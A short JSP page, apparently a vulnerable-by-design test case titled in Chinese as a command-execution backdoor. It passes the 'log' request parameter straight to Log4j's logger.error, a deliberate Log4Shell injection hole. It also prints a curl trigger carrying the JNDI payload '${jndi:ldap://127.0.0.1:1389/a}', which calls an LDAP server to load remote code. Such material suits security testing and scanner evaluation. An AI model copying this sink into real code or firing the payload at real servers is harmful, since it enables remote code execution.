<%@page import="org.apache.logging.log4j.Logger"%>
<%@page import="org.apache.logging.log4j.LogManager"%>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>004 - 命令执行后门（无回显，无拼接）</title>
</head>
<body>
<h1>004 - 命令执行后门（无回显，无拼接）</h1>
<%
	String defaultQuery = "?log=${jndi:ldap://127.0.0.1:1389/a}";
	Logger logger = LogManager.getLogger(this.getClass());
    String log = request.getParameter("log");
    if (log != null) {
        logger.error(log);
    }
%>
<p>触发: </p>
<p>curl '<a href="<%=request.getRequestURL()+defaultQuery%>"
            target="_blank"><%=request.getRequestURL() + defaultQuery%>
</a>'</p>
<br>
</body>
</html>
